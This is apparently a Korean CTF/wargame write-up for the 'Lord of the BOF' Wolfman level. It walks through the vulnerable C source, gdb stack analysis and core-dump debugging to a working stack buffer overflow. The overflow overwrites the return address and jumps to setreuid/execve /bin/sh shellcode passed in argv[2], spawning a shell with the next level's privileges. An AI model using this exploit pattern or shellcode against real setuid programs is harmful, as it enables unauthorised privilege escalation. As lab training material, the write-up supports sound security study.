Orc -> Wolfman

**wolfman.c**
```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - wolfman
        - egghunter + buffer hunter
*/

#include <stdio.h>
#include <stdlib.h>

extern char **environ;

main(int argc, char *argv[])
{
	char buffer[40];
	int i;

	if(argc < 2){
		printf("argv error\n");
		exit(0);
	}

	// egghunter 
	for(i=0; environ[i]; i++)
		memset(environ[i], 0, strlen(environ[i]));

	if(argv[1][47] != '\xbf')
	{
		printf("stack is still your friend.\n");
		exit(0);
	}
	strcpy(buffer, argv[1]); 
	printf("%s\n", buffer);

        // buffer hunter
        memset(buffer, 0, 40);
}
```
이번에는 buffer hunter가 추가되어 buffer의 값을 전부 0으로 초기화 시켜버립니다. 하지만 저는 argv2를 사용할 것 이기 때문에 상관없습니다.<br>
저번 문제와 똑같은 방법으로 공격을 하면 됩니다.
```
0x8048500 <main>:	push   %ebp
0x8048501 <main+1>:	mov    %ebp,%esp
0x8048503 <main+3>:	sub    %esp,44
~~~생략~~~
0x80485bd <main+189>:	call   0x8048440 <strcpy>
0x80485c2 <main+194>:	add    %esp,8
0x80485c5 <main+197>:	lea    %eax,[%ebp-40]
0x80485c8 <main+200>:	push   %eax
~~~생략~~~
```
buffer의 크기가 40이라는 것을 알 수 있습니다.
>>bufer[40] + SFP[4] + RET[4]

이번에도 strcpy부분에 break를 걸고 분석을 해보겠습니다.
```
(gdb) r `python -c 'print "\xbf"*48'` `python -c 'print "\x90"*100'`
Starting program: /home/orc/temp/wolfman `python -c 'print "\xbf"*48'` `python -c 'print "\x90"*100'`

Breakpoint 1, 0x80485bd in main ()
(gdb) x/100x $esp
~~~생략~~~
0xbffffc04:	0x772f706d	0x6d666c6f	0xbf006e61	0xbfbfbfbf
0xbffffc14:	0xbfbfbfbf	0xbfbfbfbf	0xbfbfbfbf	0xbfbfbfbf
0xbffffc24:	0xbfbfbfbf	0xbfbfbfbf	0xbfbfbfbf	0xbfbfbfbf
0xbffffc34:	0xbfbfbfbf	0xbfbfbfbf	0x00bfbfbf	0x90909090
0xbffffc44:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc54:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc64:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc74:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc84:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc94:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffca4:	0x00000000	0x00000000	0x00000000	0x00000000
~~~생략~~~
```
이번에는 0xbffffc54 주소로 공격을 해보도록 하겠습니다. 
```
[orc@localhost temp]$ ./wolfman `python -c 'print "\x90"*44 + "\x54\xfc\xff\xbf"'` `python -c 'print "\x90"*100 + "\x31\xc0\xb0\x31\xcd\x80\x89\xc1\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`
T
Segmentation fault (core dumped)
```
엥 core dumped가 떴습니다. 이유는 바로 bash2를 까먹었기 때문이었습니다.<br>
bash2를 띄우고 다시 공격을 해서 core파일을 분석해보도록 하겠습니다.
```
[orc@localhost temp]$ gdb -c core
~~~생략~~~
Core was generated by `./wolfman AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 񠐐'.
Program terminated with signal 11, Segmentation fault.
#0  0x40030942 in ?? ()
(gdb) x/1000x $esp
~~~생략~~~
0xbffffba8:	0x6c6f772f	0x6e616d66	0x41414100	0x41414141
0xbffffbb8:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffbc8:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffbd8:	0x41414141	0xfffc0041	0x909000bf	0x90909090
0xbffffbe8:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffbf8:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc08:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc18:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc28:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffc38:	0x90909090	0x90909090	0x90909090	0xc0319090
~~~생략~~~
```
core dumped가 뜨면 자동으로 core파일이 생성이 됩니다.

`ulimit –c unlimited`

다음 명령어로 core파일을 생성시킬 수 있습니다.<br>
0xbffffbe8의 주소로 공격을 하겠습니다.

```
[orc@localhost orc]$ ./wolfman `python -c 'print "A"*44 + "\xe8\xfb\xff\xbf"'` `python -c 'print "\x90"*100 + "\x31\xc0\xb0\x31\xcd\x80\x89\xc1\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA鼿¿
bash$ my-pass
euid = 505
love eyuna
```
공격에 성공했습니다.<br>
모든 공격은 복사한 파일에 해서 성공을 하면 원본 파일에 시도를 하는 것 입니다. <br>
복사한 파일에 공격을 시도하여 성공하는 부분은 생략하도록 하겠습니다.